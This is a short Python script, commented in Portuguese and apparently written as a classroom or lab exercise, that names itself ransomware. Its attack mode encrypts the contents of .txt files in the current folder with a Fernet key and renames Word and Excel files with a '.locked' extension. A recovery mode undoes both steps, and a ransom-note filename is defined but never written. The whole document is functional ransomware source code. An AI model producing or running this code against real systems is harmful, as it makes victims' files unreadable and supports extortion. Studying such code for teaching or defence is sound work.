from cryptography.fernet import Fernet
import os

# Configurações
ARQUIVO_CHAVE = "chave.key"
ARQUIVO_RESGATE = "LEIA_ISSO.txt"
EXTENSAO_INACESSIVEL = ".locked"

def carregar_ou_gerar_chave():
    """Gera ou carrega a chave para permitir a reversão [1, 2]."""
    if not os.path.exists(ARQUIVO_CHAVE):
        chave = Fernet.generate_key()
        with open(ARQUIVO_CHAVE, "wb") as key_file:
            key_file.write(chave)
        return chave
    with open(ARQUIVO_CHAVE, "rb") as key_file:
        return key_file.read()

def processar_alvos(fernet_inst, modo="ataque"):
    """
    Diferencia o tratamento: 
    - .txt: Criptografa conteúdo [2].
    - Word/Excel: Torna inacessível (muda extensão).
    """
    for arquivo in os.listdir("."):
        # Ignora arquivos do próprio script e a chave
        if arquivo in [ARQUIVO_CHAVE, ARQUIVO_RESGATE, "ransomware.py"]:
            continue

        # LÓGICA DE ATAQUE
        if modo == "ataque":
            if arquivo.endswith(".txt"):
                # Criptografa apenas o conteúdo, mantém o nome .txt [2]
                with open(arquivo, "rb") as f:
                    conteudo = f.read()
                novo_conteudo = fernet_inst.encrypt(conteudo)
                with open(arquivo, "wb") as f:
                    f.write(novo_conteudo)
                print(f"Conteúdo de {arquivo} criptografado.")

            elif arquivo.endswith((".doc", ".docx", ".xls", ".xlsx")):
                # Torna inacessível mudando a extensão
                os.rename(arquivo, arquivo + EXTENSAO_INACESSIVEL)
                print(f"Arquivo {arquivo} agora está inacessível.")

        # LÓGICA DE RECUPERAÇÃO
        elif modo == "recuperacao":
            if arquivo.endswith(".txt"):
                # Descriptografa o conteúdo do .txt [3]
                try:
                    with open(arquivo, "rb") as f:
                        conteudo = f.read()
                    original = fernet_inst.decrypt(conteudo)
                    with open(arquivo, "wb") as f:
                        f.write(original)
                except: pass 

            elif arquivo.endswith(EXTENSAO_INACESSIVEL):
                # Restaura a extensão original
                os.rename(arquivo, arquivo.replace(EXTENSAO_INACESSIVEL, ""))

if __name__ == "__main__":
    minha_chave = carregar_ou_gerar_chave()
    fernet = Fernet(minha_chave)

    print("1. Executar Ataque")
    print("2. Executar Recuperação")
    opcao = input("Escolha: ")

    if opcao == "1":
        processar_alvos(fernet, modo="ataque")
        # Gera mensagem de resgate [3]
    elif opcao == "2":
        processar_alvos(fernet, modo="recuperacao")
        print("Arquivos restaurados.")
